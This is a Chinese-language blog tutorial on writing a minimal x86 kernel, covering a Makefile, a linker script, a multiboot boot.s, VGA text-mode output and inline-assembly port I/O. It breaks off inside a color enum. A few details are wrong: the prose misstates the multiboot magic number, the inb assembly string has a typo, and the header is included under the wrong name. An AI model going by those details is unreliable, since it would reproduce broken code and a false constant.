<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!Makefile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------</span></span><br><span class="line"><span class="comment"># 编译: 通过.c.o和.s.o规则，所有的.c和.s文件分别被编译成.o文件。</span></span><br><span class="line"><span class="comment"># 链接: 所有的.o文件通过link规则被链接成单个内核文件hx_kernel。</span></span><br><span class="line"><span class="comment"># 更新映像文件: 通过update_image规则，将内核文件复制到软盘映像中。</span></span><br><span class="line"><span class="comment"># 清理: 通过clean命令删除所有生成的文件，以便重新构建。</span></span><br><span class="line"><span class="comment"># 运行和调试: 提供了多种运行和调试内核的方式，如使用QEMU、Bochs和cgdb。</span></span><br><span class="line"><span class="comment">#-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># patsubst 处理所有在 C_SOURCES 字列中的字（一列文件名），如果它的 结尾是 &#x27;.c&#x27;，就用 &#x27;.o&#x27; 把 &#x27;.c&#x27; 取代</span></span><br><span class="line">C_SOURCES = <span class="variable">$(<span class="built_in">shell</span> find . -name &quot;*.c&quot;)</span></span><br><span class="line">C_OBJECTS = <span class="variable">$(<span class="built_in">patsubst</span> %.c, %.o, <span class="variable">$(C_SOURCES)</span>)</span>   <span class="comment">#将所有.c文件转成 .o文件</span></span><br><span class="line">S_SOURCES = <span class="variable">$(<span class="built_in">shell</span> find . -name &quot;*.s&quot;)</span>          <span class="comment">#查找所有.s文件</span></span><br><span class="line">S_OBJECTS = <span class="variable">$(<span class="built_in">patsubst</span> %.s, %.o, <span class="variable">$(S_SOURCES)</span>)</span>   <span class="comment">#.s 文件转成 .o文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义编译器命令 cc = gcc 相当于起别名 编译器用gcc 链接器用ld 汇编器用nasm </span></span><br><span class="line">CC = gcc</span><br><span class="line">LD = ld</span><br><span class="line">ASM = nasm  </span><br><span class="line"></span><br><span class="line"><span class="comment">#编译  链接选项  注意链接文件目录</span></span><br><span class="line">C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-builtin -fno-stack-protector -I <span class="keyword">include</span></span><br><span class="line">LD_FLAGS = -T scripts/kernel.ld -m elf_i386 -nostdlib</span><br><span class="line">ASM_FLAGS = -f elf -g -F stabs</span><br><span class="line"></span><br><span class="line"><span class="comment">#默认目标 编译生成并 更新</span></span><br><span class="line"><span class="section">all: <span class="variable">$(S_OBJECTS)</span> <span class="variable">$(C_OBJECTS)</span> link update_image</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The automatic variable `$&lt;&#x27; is just the first prerequisite 表示规则中的第一个依赖项 使用模式规则来编译代码</span></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">	@echo 编译代码文件 <span class="variable">$&lt;</span> ...</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(C_FLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">.s.o:</span></span><br><span class="line">	@echo 编译汇编文件 <span class="variable">$&lt;</span> ...</span><br><span class="line">	<span class="variable">$(ASM)</span> <span class="variable">$(ASM_FLAGS)</span> <span class="variable">$&lt;</span></span><br><span class="line"><span class="comment">#链接所有.o文件生成 内核文件</span></span><br><span class="line"><span class="section">link:</span></span><br><span class="line">	@echo 链接内核文件...</span><br><span class="line">	<span class="variable">$(LD)</span> <span class="variable">$(LD_FLAGS)</span> <span class="variable">$(S_OBJECTS)</span> <span class="variable">$(C_OBJECTS)</span> -o hx_kernel</span><br><span class="line"></span><br><span class="line"><span class="comment">#.PHONY 伪目标，无论是否存在同名文件 命令都被执行</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(RM)</span> <span class="variable">$(S_OBJECTS)</span> <span class="variable">$(C_OBJECTS)</span> hx_kernel</span><br><span class="line"><span class="comment">#将生成的内核文件挂载在映像文件</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:update_image</span></span><br><span class="line"><span class="section">update_image:</span></span><br><span class="line">	sudo mount floppy.img /mnt/kernel</span><br><span class="line">	sudo cp hx_kernel /mnt/kernel/hx_kernel</span><br><span class="line">	sleep 1</span><br><span class="line">	sudo umount /mnt/kernel</span><br><span class="line"><span class="comment">#挂载</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:mount_image</span></span><br><span class="line"><span class="section">mount_image:</span></span><br><span class="line">	sudo mount floppy.img /mnt/kernel</span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:umount_image</span></span><br><span class="line"><span class="section">umount_image:</span></span><br><span class="line">	sudo umount /mnt/kernel</span><br><span class="line"></span><br><span class="line"><span class="comment">#调试方式</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:qemu</span></span><br><span class="line"><span class="section">qemu:</span></span><br><span class="line">	qemu -fda floppy.img -boot a	</span><br><span class="line">	<span class="comment">#add &#x27;-nographic&#x27; option if using server of linux distro, such as fedora-server,or &quot;gtk initialization failed&quot; error will occur.</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:bochs</span></span><br><span class="line"><span class="section">bochs:</span></span><br><span class="line">	bochs -f scripts/bochsrc.txt</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>:debug</span></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	qemu -S -s -fda floppy.img -boot a &amp;</span><br><span class="line">	sleep 1</span><br><span class="line">	cgdb -x scripts/gdbinit</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="1-3-kernel-ld-文件"><a href="#1-3-kernel-ld-文件" class="headerlink" title="1.3 kernel.ld 文件"></a>1.3 kernel.ld 文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* kernel.ld −− 针对 kernel 格式所写的链接脚本</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"> ENTRY(start)</span><br><span class="line"> SECTIONS</span><br><span class="line"> &#123;</span><br><span class="line">	<span class="comment">/* 段起始位置 */</span></span><br><span class="line">	. = <span class="number">0x100000</span>;   <span class="comment">// 后面的段 从0x100000开始 即是1MB</span></span><br><span class="line">.text :</span><br><span class="line">&#123;</span><br><span class="line"> 	*(.text)</span><br><span class="line"> 	. = ALIGN(<span class="number">4096</span>);  <span class="comment">// 页对齐到 4096</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">.data :</span><br><span class="line"> &#123;</span><br><span class="line"> 	*(.data)</span><br><span class="line"> 	*(.rodata)</span><br><span class="line">	. = ALIGN(<span class="number">4096</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> .bss :</span><br><span class="line"> &#123;</span><br><span class="line"> 	*(.bss)</span><br><span class="line"> 	. = ALIGN(<span class="number">4096</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">.stab :</span><br><span class="line"> &#123;</span><br><span class="line">	*(.stab)</span><br><span class="line">	. = ALIGN(<span class="number">4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.stabstr :</span><br><span class="line"> &#123;</span><br><span class="line"> 	*(.stabstr)</span><br><span class="line"> 	. = ALIGN(<span class="number">4096</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">	/DISCARD/ : &#123; *(.comment) *(.eh_frame) &#125;  <span class="comment">// 丢弃段</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>复习一下</p>
<p>.text 代码段</p>
<p>.data 已初始化数据段</p>
<p>.bss 未初始化数据段</p>
<p>.stab 调试符号表</p>
<p>.stabstr 字符串表</p>
</blockquote>
<h1 id="2-启动过程-grub-和-multiboot"><a href="#2-启动过程-grub-和-multiboot" class="headerlink" title="2.启动过程 grub 和 multiboot"></a>2.启动过程 grub 和 multiboot</h1><blockquote>
<p>模拟内核 是 32位的    地址寻址线也为32位  可以寻址 2的32次方  4GB地址空间</p>
</blockquote>
<p>启动过程，在bios 初始化设备完成后，读取存储设备的第一个扇区如果第一个扇区512个字节的最后两个字节是0x55 和 0xAA 那么该存储设备就是可以启动的</p>
<blockquote>
<p>为什么 要使用 grub 而不编写 bootloader呢  因为打算将这个内核与其他win Linux系统共存 所以使用grub （GRand Unified Bootloader） 从而需要了解 multiloader</p>
</blockquote>
<h1 id="3-Hello-OS-Kernel"><a href="#3-Hello-OS-Kernel" class="headerlink" title="3.Hello OS Kernel"></a>3.Hello OS Kernel</h1><h2 id="3-1-编译参数-解释"><a href="#3-1-编译参数-解释" class="headerlink" title="3.1 编译参数 解释"></a>3.1 编译参数 解释</h2><blockquote>
<p><code>C_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-builtin -fno-stack-protector -I include</code></p>
</blockquote>
<ul>
<li>-m32 生成32位代码</li>
<li>-ggdb 和 -gstabs+ 添加相关的调试信息</li>
<li>-nostdinc 不包含C语言的标准库的头文件</li>
<li>-fno-builtin gcc 不主动使用自己的内建函数  除非显示的声明</li>
<li>-fno-stack-protector 不使用栈保护</li>
</ul>
<blockquote>
<p><code>LD_FLAGS = -T scripts/kernel.ld -m elf_i386 -nostdlib</code></p>
</blockquote>
<ul>
<li>-T…  使用我们自己的链接器脚本</li>
<li>-m elf_i386 生成i386平台下的elf 格式的 可执行文件，这是Linux 下的可执行文件格式</li>
<li>-nostdlib 不使用 c语言标准库</li>
</ul>
<h2 id="3-2-启动镜像制作"><a href="#3-2-启动镜像制作" class="headerlink" title="3.2 启动镜像制作"></a>3.2 启动镜像制作</h2><ul>
<li><p>作者使用 软盘制作，相对于硬盘 比较简单</p>
</li>
<li><p>并且使用FAT12 用作文件系统</p>
</li>
</ul>
<h2 id="3-3-boot-s-文件"><a href="#3-3-boot-s-文件" class="headerlink" title="3.3 boot.s 文件"></a>3.3 boot.s 文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">; boot.s</span><br><span class="line">; </span><br><span class="line">MBOOT_HEADER_MAGIC 	equ 	0x1BADB002 	; Multiboot 魔数，由规范决定的</span><br><span class="line"></span><br><span class="line">MBOOT_PAGE_ALIGN 	equ 	1 &lt;&lt; 0    	; 0 号位表示所有的引导模块将按页(4KB)边界对齐</span><br><span class="line">MBOOT_MEM_INFO 		equ 	1 &lt;&lt; 1    	; 1 号位通过 Multiboot 信息结构的 mem_* 域包括可用内存的信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; 定义我们使用的 Multiboot 的标记</span><br><span class="line">MBOOT_HEADER_FLAGS 	equ 	MBOOT_PAGE_ALIGN | MBOOT_MEM_INFO</span><br><span class="line"></span><br><span class="line">; 域checksum是一个32位的无符号值，当与其他的magic域(也就是magic和flags)相加时，</span><br><span class="line">; 要求其结果必须是32位的无符号值 0 (即magic + flags + checksum = 0)</span><br><span class="line">MBOOT_CHECKSUM 		equ 	- (MBOOT_HEADER_MAGIC + MBOOT_HEADER_FLAGS)</span><br><span class="line"></span><br><span class="line">; 符合Multiboot规范的 OS 映象需要这样一个 magic Multiboot 头</span><br><span class="line"></span><br><span class="line">; Multiboot 头的分布必须如下表所示：</span><br><span class="line">; ----------------------------------------------------------</span><br><span class="line">; 偏移量  类型  域名        备注</span><br><span class="line">;</span><br><span class="line">;   0     u32   magic       必需</span><br><span class="line">;   4     u32   flags       必需 </span><br><span class="line">;   8     u32   checksum    必需 </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">;--------------------------------</span><br><span class="line">; 代码真正开始</span><br><span class="line">;-----------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[BITS 32]  	; 所有代码以 32-bit 的方式编译</span><br><span class="line"></span><br><span class="line">section .text 	; 代码段从这里开始</span><br><span class="line"></span><br><span class="line">; 在代码段的起始位置设置符合 Multiboot 规范的标记</span><br><span class="line"></span><br><span class="line">dd MBOOT_HEADER_MAGIC 	; GRUB 会通过这个魔数判断该映像是否支持</span><br><span class="line">dd MBOOT_HEADER_FLAGS   ; GRUB 的一些加载时选项，其详细注释在定义处</span><br><span class="line">dd MBOOT_CHECKSUM       ; 检测数值，其含义在定义处</span><br><span class="line"></span><br><span class="line">[GLOBAL start] 		    ; 内核代码入口，此处提供该声明给 ld 链接器</span><br><span class="line">[GLOBAL glb_mboot_ptr] 	; 全局的 struct multiboot * 变量</span><br><span class="line">[EXTERN kern_entry] 	; 声明内核 C 代码的入口函数</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	cli  			    ; 此时还没有设置好保护模式的中断处理，要关闭中断</span><br><span class="line">				        ; 所以必须关闭中断</span><br><span class="line">	mov esp, STACK_TOP  	 ; 设置内核栈地址</span><br><span class="line">	mov ebp, 0 		    ; 帧指针修改为 0</span><br><span class="line">	and esp, 0FFFFFFF0H	 ; 栈地址按照16字节对齐</span><br><span class="line">	mov [glb_mboot_ptr], ebx ; 将 ebx 中存储的指针存入全局变量</span><br><span class="line">	call kern_entry		 ; 调用内核入口函数</span><br><span class="line">stop:</span><br><span class="line">	hlt 			 ; 停机指令，什么也不做，可以降低 CPU 功耗</span><br><span class="line">	jmp stop 		 ; 到这里结束，关机什么的后面再说</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">section .bss 			 ; 未初始化的数据段从这里开始</span><br><span class="line">stack:</span><br><span class="line">	resb 32768 	 	     ; 这里作为内核栈</span><br><span class="line">glb_mboot_ptr: 			 ; 全局的 multiboot 结构体指针</span><br><span class="line">	resb 4</span><br><span class="line"></span><br><span class="line">STACK_TOP equ $-stack-1 	 ; 内核栈顶，$ 符指代是当前地址</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>



<blockquote>
<p>multiboot 的头部 必须包含以下三个：</p>
<ol>
<li>magic  number ： 必须包含一个固定的数 – 0xABADB002 用于引导程序识别兼容multi内核</li>
<li>flags ：标志引导程序需要提供哪些额外的信息 是否需要内核对齐 是否需要内存信息等</li>
<li>checksum：校验和 用来确保 要求其结果必须是32位的无符号值 0 (即magic + flags + checksum &#x3D; 0)</li>
</ol>
</blockquote>
<h2 id="3-4-入口函数实现"><a href="#3-4-入口函数实现" class="headerlink" title="3.4 入口函数实现"></a>3.4 入口函数实现</h2><blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>inlcude&#x2F;types.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_TYPES_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_TYPES_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NULL</span></span><br><span class="line">        <span class="meta">#<span class="keyword">define</span> NULL 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TRUE</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">short</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>   <span class="comment">// include types h </span></span></span><br></pre></td></tr></table></figure>



<p>首先make</p>
<p>然后执行 make qemu</p>
<blockquote>
<p>make 的时候 可能会报错 sudo mount floppy.img &#x2F;mnt&#x2F;kernel mount: &#x2F;mnt&#x2F;kernel: mount point does not exist.</p>
<p>这个时候直接去 &#x2F;mnt 下创建kernel文件夹就行 提示权限不够就用sudo mkdir kernel</p>
</blockquote>
<p>此时出现的是空白</p>
<p><img src="/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/image-20240430183522064.png" alt="image-20240430183522064"></p>
<blockquote>
<p>执行  make qemu</p>
<p>注意！！！ 在vscode 下终端执行会报错 </p>
<p>需要去终端执行</p>
<p>解决方案见：<a href="https://blog.csdn.net/endangered_ds/article/details/135860103">qemu-system-i386 库文件libpthread.so.0未定义符号_undefined symbol:libc_pthread_init-CSDN博客</a></p>
</blockquote>
<p>在entry中添加下面代码会显示 hello OS kernel</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;typers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *input = (<span class="type">uint8_t</span> *)<span class="number">0xB8000</span>;</span><br><span class="line">	<span class="type">uint8_t</span> color = (<span class="number">0</span> &lt;&lt; <span class="number">4</span>) | (<span class="number">15</span> &amp; <span class="number">0x0F</span>);</span><br><span class="line"></span><br><span class="line">	*input++ = <span class="string">&#x27;H&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;e&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;l&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;l&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;o&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;,&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27; &#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;O&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;S&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27; &#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;K&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;e&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;r&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;n&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;e&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;l&#x27;</span>; *input++ = color;</span><br><span class="line">	*input++ = <span class="string">&#x27;!&#x27;</span>; *input++ = color;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/image-20240430184001925.png" alt="image-20240430184001925"></p>
<h1 id="4-字符模式下的显卡驱动"><a href="#4-字符模式下的显卡驱动" class="headerlink" title="4.字符模式下的显卡驱动"></a>4.字符模式下的显卡驱动</h1><blockquote>
<p>所有在PC上工作的显卡 在加点初始化之后都会自动初始化到 <strong>80*25</strong> 文本模式，表示屏幕被划分成了25行，每行可以显示80个字符</p>
<p>所以一屏可以显示2000个字符 0xB8000 - 0xBFFFF这个地址段 便是映射到文本模式的显存的</p>
</blockquote>
<p>内码：定义了字符在内存中存储的形式</p>
<p>对应关系从0xB8000 开始 每两个字节表示屏幕上显示一个字符。这两个字节前一个字节是显示字符串的ASCII 码，后一个是控制这个字符颜色和属性的控制信息</p>
<p><img src="/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/image-20240430204238998.png" alt="image-20240430204238998"></p>
<p><img src="/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/image-20240430204540029.png" alt="image-20240430204540029"></p>
<h2 id="4-1-端口读写函数的实现"><a href="#4-1-端口读写函数的实现" class="headerlink" title="4.1 端口读写函数的实现"></a>4.1 端口读写函数的实现</h2><blockquote>
<p>libs&#x2F;common.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写一个字节</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> value)</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;outb %1, %0&quot;</span> :: <span class="string">&quot;dN&quot;</span> (port), <span class="string">&quot;a&quot;</span> (value))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字节</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inb %1, &amp;0&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;dN&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字 （两个字节）</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint16_t</span> <span class="title function_">inw</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inw %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span> (ret) : <span class="string">&quot;dN&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>采用c语言配合汇编代码编写</p>
<ul>
<li><code>outb %1, %0 </code> 输出指令 像端口发送数据 %1 和 %0 是操作占位符，对应后面的输入输出操作列表</li>
<li><code>dN</code>（port）：告诉编译器 使用dx寄存器 或者一个立即数来存放端口号 port</li>
<li><code>a (value)</code>：约束使用指定寄存器ax 存放要输出的值 value</li>
</ul>
<blockquote>
<p>GCC 内嵌汇编语法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">( AssemblerTemplate : OutputOperands : InputOperands : Clobbers )</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>AssemblerTemplate</code> 是实际的汇编指令。</li>
<li><code>OutputOperands</code> 是输出操作数，指示汇编代码写入的变量。</li>
<li><code>InputOperands</code> 是输入操作数，指示汇编代码读取的变量。</li>
<li><code>Clobbers</code> 告诉编译器这段汇编代码可能会修改的寄存器或内存。</li>
</ul>
</blockquote>
<blockquote>
<p>inline 用于提示编译器将函数的定义直接插入到函数调用的位置，而不是通过函数调用的 方式执行 好处：</p>
<ol>
<li>减少函数调用的开销 — 程序本身较小的时候 省略调用过程减少开销</li>
<li>优化程序性能 — 函数体直接插入调用位置，编译器更容易优化</li>
<li>避免链接问题</li>
<li>提升模块化  — 小的 频繁调用的函数定义为inline</li>
<li>支持递归</li>
</ol>
<p>宏定义 没有参数类型检查喔  inline 有</p>
</blockquote>
<blockquote>
<p>include&#x2F;common.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_COMMON_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_COMMON_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;typers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//端口写一个字节</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> value)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字节</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">inw</span><span class="params">(<span class="type">uint16_t</span> port)</span>; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// include</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>libs&#x2F;common.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写一个字节</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> value)</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;outb %1, %0&quot;</span> :: <span class="string">&quot;dN&quot;</span> (port), <span class="string">&quot;a&quot;</span> (value))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字节</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inb %1, &amp;0&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;dN&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读一个字</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint16_t</span> <span class="title function_">inw</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inw %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span> (ret) : <span class="string">&quot;dN&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-2-颜色的枚举定义和屏幕操作函数实现"><a href="#4-2-颜色的枚举定义和屏幕操作函数实现" class="headerlink" title="4.2 颜色的枚举定义和屏幕操作函数实现"></a>4.2 颜色的枚举定义和屏幕操作函数实现</h2><blockquote>
<p>include&#x2F;console.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_CONSOLE_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_CONSOLE_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;typers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> </span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">real_color</span> &#123;</span></span><br><span class="line">    rc_black = <span class="number">0</span>,</span><br><span class="line">    rc_blue = <span class="number">1</span>,</span><br><span class="line">    rc_green = <span class="number">2</span>,</span><br><span class="line">    rc_cyan = <span class="number">3</span>,</span><br><span class="line">    rc_red = <span class="number">4</span>,</span><br><span class="line">    rc_magenta = <span class="number">5</span>,</span><br><span class="line">    rc_brown = <span class="number">6</span>,</span><br><span class="line">    rc_light_grey = <span class="number">7</span>,</span><br><span class="line">    rc_dark_grey = <span class="number">8</span>,</span><br><span class="line">    rc_light_blue = <span class="number">9</span>,</span><br><span class="line">    rc_light_green = <span class="number">10</span>,</span><br><span class="line">    rc_light_cyan = <span class="number">11</span>,</span><br><span class="line">    rc_light_red = <span class="number">12</span>,</span><br><span class="line">    rc_light_magenta = <span class="number">13</span>,</span><br><span class="line">    rc_light_brown = <span class="number">14</span>,  <span class="comment">//yellow</span></span><br><span class="line">    rc_white = <span class="number">15</span></span><br><span 